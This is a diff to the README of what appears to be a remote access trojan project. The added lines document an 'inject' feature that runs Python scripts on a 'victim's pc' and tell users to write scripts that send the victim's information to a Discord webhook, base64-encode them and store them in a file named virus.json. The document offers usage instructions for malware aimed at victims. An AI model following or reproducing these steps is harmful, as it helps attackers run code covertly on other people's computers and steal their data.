@@ -69,9 +69,14 @@ You must host this API on a free host site like 'heroku.com' or '000webhost.com'
 ## INJECT
 
 ```
-
-
+The 'inject' function allows you to inject python script directly on the victim's pc.
+You can add your own scripts:
+1. Make your script send the information to a discord webhook
+2. Replace this webhook with "L!Nk123"
+3. Encrypt the script in base64
+4. Put it in ./RAT/json/virus.json
 ```
+<img src="https://github.com/loTus04/RATata/blob/main/img/rat_inject.PNG" width="443" height="256"/>
 
 ## Author
 
